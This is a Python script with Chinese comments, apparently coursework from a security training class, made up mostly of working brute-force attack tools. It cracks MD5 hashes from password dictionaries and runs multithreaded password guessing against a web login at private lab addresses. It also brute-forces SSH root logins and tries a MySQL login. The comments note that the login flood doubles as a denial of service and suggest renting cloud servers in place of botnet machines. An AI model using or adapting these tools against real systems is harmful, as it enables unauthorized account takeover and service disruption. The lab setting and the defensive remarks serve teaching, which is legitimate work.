import hashlib, time, requests, threading

# 爆破MD5，核心在于字典文件是否选取恰当

def md5(source):
    # 打开字典文件，读取字典数据到列表对象中
    with open('../dict/password-top100k.txt') as file:
        pw_list = file.readlines()

    with open('../dict/password-top6000.txt') as file:
        pw_list2 = file.readlines()

    pw_list.extend(pw_list2)

    # 遍历列表，逐个对比
    for password in pw_list:
        if hashlib.md5(password.strip().encode()).hexdigest() == source:
            print(f"成功破解，明文是：{password.strip()}")


# 爆破WoniuSales，用户名已知，密码未知
def ws_single():
    with open('../dict/password-top100k.txt') as file:
        pw_list = file.readlines()

    url = 'http://192.168.112.130:8080/woniusales/user/login'

    count = 0
    for password in pw_list:
        data = {'username':'woniu', 'password': password.strip(), 'verifycode':'0000'}
        resp = requests.post(url=url, data=data)
        if 'login-fail' not in resp.text:
            print(f'疑似破解成功, 密码为：{password.strip()}')
            print(f"共计尝试 {count} 次.")
            exit()
        count += 1

    print(f"共计尝试 {count} 次.")


# 未知用户名，未知密码，多线程并行破解
# 500用户，6000条密码，最多300万次登录操作，
# 同时，由于多线程并发登录，导致服务器压力世增（DOS），进而服务器的响应时间会显著变慢
# 如果服务器不小心崩溃，那么很有可能引起重视，进而检查访问日志，封锁IP，（DDOS可以更好模拟）
# 每个用户一个线程，每一个线程循环6000次

count = 0
def ws_thread(username):
    global count

    with open('../dict/password-top6000.txt') as file:
        pw_list = file.readlines()

    url = 'http://192.168.112.130:8080/woniusales/user/login'

    for password in pw_list:
        data = {'username': username, 'password': password.strip(), 'verifycode':'0000'}
        resp = requests.post(url=url, data=data)
        if 'login-fail' not in resp.text:
            print(f'疑似破解成功, 密码为：{password.strip()}')
            print(f"共计尝试 {count} 次.")
            exit()
        count += 1

    print(f"共计尝试 {count} 次.")


# 如果用户字典有5000条数据，又该如何处理？每个线程处理10个用户。
# 本题的核心：如何给多线程分配任务，此类思路可以解决大部分多线程的常规问题，比如多线程爬虫，扫描工作等。
def ws_thread_10(sublist):
    with open('../dict/password-top6000.txt') as file:
        pw_list = file.readlines()

    url = 'http://192.168.112.130:8080/woniusales/user/login'

    for username in sublist:
        for password in pw_list:
            data = {'username': username.strip(), 'password': password.strip(), 'verifycode':'0000'}
            resp = requests.post(url=url, data=data)
            if 'login-fail' not in resp.text:
                print(f'疑似破解成功, 账号为：{username.strip()}，密码为：{password.strip()}')
                exit()


# 爆破SSH，建议使用证书进行登录
def ssh_crack():
    import paramiko
    with open('../dict/password-top500.txt') as file:
        pw_list = file.readlines()

    for password in pw_list:
        try:
            transport = paramiko.Transport(('192.168.112.188', 22))
            transport.connect(username='root', password=password.strip())
            print(f"登录成功，密码为：{password.strip()}")
            exit()
        except:
            pass

        time.sleep(2)

    # ssh = paramiko.SSHClient()
    # ssh._transport = transport

def mysql_crack():
    import pymysql
    try:
        conn = pymysql.connect(host='192.168.112.188', user='qiang', password='1234567')
        print("成功")
    except:
        pass


if __name__ == '__main__':
    # md5('57b8cc76b3aa72468c586ce9fdb8db15')
    # md5('b5b1c07c180fefc77671906f382488f2')

    # ws_single()

    # 读取用户字典，并遍历获取用户名
    # with open('../dict/username-top500.txt') as file:
    #     user_list = file.readlines()
    #
    # for username in user_list:
    #     threading.Thread(target=ws_thread, args=(username.strip(),)).start()


    # 每个线程负责10个用户
    with open('../dict/username-top500.txt') as file:
        user_list = file.readlines()

    for i in range(0, len(user_list), 10):
        sublist = user_list[i:i+10]
        threading.Thread(target=ws_thread_10, args=(sublist, )).start()


    # ssh_crack()

    mysql_crack()


# 关于爆破的补充知识
'''
应用场景：只要有密码的地方，均可以尝试使用爆破方案
应用条件：爆破不受次数的约束，可以一直尝试，所以爆破的防护方案：次数限制
没有肉鸡怎么办？去各云服务器平台临时租赁服务器

作业：
1、如何爆破WIFI？如何防护？
2、如何基于SSH证书进行登录，如何配置SSH安全策略。
3、TCP/IP/UDP/ARP/ICMP

一个进程，的线程数量有限，如何能够提升并发能力呢？将任务分配到不同的电脑，在同一台电脑上运行多个进程。
'''